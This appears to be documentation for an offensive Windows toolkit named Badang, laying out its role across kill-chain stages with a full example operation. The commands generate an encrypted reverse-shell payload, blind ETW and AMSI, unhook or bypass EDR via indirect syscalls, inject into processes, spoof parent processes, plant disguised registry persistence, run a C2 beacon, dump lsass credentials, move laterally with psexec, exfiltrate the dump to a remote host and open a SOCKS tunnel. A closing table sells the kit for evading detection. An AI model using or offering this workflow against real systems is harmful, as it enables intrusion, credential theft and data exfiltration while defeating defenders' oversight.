# Badang in the Kill Chain

## Stages

```
 1. Initial Access           — phishing, exploit, creds (not Badang)
 2. Payload Generation       ← badang generate + encrypt + package
 3. Pre-Execution Checks     ← badang loader (anti-sandbox, anti-debug, anti-VM)
 4. Telemetry Blinding       ← badang etw + amsi
 5. Recon Target Process     ← badang analyze + scan
 6. EDR Bypass               ← badang unhook / syscall --indirect
 7. Injection                ← badang inject (8 techniques) + ppid
 8. Runtime Evasion          ← badang sleep + spoof
 9. Persistence              ← badang persist (6 methods)
10. Command & Control        ← badang comms (HTTPS beacon + RC4 transport)
11. Post-Exploitation        ← badang postex (9 modules)
    ├─ Credentials           ← lsass dump, SAM export, token delegation
    ├─ Lateral Movement      ← psexec, wmi, winrm
    ├─ Exfiltration          ← staged file transfer, RC4 encrypted
    └─ Tunneling             ← SOCKS5 proxy, port forwarding
```

Badang covers stages 2–11: from payload generation through post-exploitation.

## Example Operation

```bash
# Step 1: Generate and encrypt a reverse shell payload
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
badang-cli encrypt --payload rev.bin --method rc4 --key "s3cret" -o encrypted.bin

# Step 2: Check if environment is safe (loader pre-checks)
badang-cli loader --check all --action exit -x -c

# Step 3: Blind EDR telemetry
badang-cli etw -x -c                     # patch EtwEventWrite
badang-cli amsi -x -c                    # patch AmsiScanBuffer

# Step 4: Find a target process
badang-cli scan --filter svchost

# Step 5: Scan for hooks
badang-cli analyze --pid 1234 -x -c
# Result: NtCreateThreadEx HOOKED, NtWriteVirtualMemory HOOKED

# Step 6: Bypass the EDR
# Option A: Remove the hooks
badang-cli unhook --unhook NtCreateThreadEx -x -c
# Option B: Use indirect syscall (resolve SSN from ntdll, execute from ntdll gadget)
badang-cli syscall --func NtCreateThreadEx --indirect -x -c

# Step 7: Inject (pick a technique)
badang-cli inject --pid 1234 --technique section --payload encrypted.bin -x -c
# Or spawn with spoofed parent first
badang-cli ppid --parent explorer.exe --child notepad.exe --suspended -x -c

# Step 8: Set up persistence
badang-cli persist --method registry --name "UpdateService" --payload encrypted.bin -x -c

# Step 9: Start comms beacon
badang-cli comms --host 10.0.0.1 --comms-key aabbccddee112233 --interval 30000 --jitter 20 -x -c

# Step 10: Post-exploitation
badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c           # creds
badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c
badang-cli postex --module exfil --file dump.bin --remote-host 10.0.0.1 --remote-port 8443 --exfil-key s3cret -x -c
badang-cli postex --module socks --listen-port 1080 -x -c                           # tunnel
```

## With vs Without Badang

| Without | With |
|---------|------|
| msfvenom payload → known signatures | Custom shellcode, no signatures |
| Inject blind → EDR catches API call | Analyze first, know what's watched |
| EDR hooks block you → operation fails | Unhook/Syscall bypasses hooks |
| Run as yourself → easy to find | Inject into legit process → blends in |
| Manual C2 setup → fragile | Integrated beacon with jitter + encryption |
| Separate tools per stage → OPSEC gaps | Single binary, all stages, one toolkit |
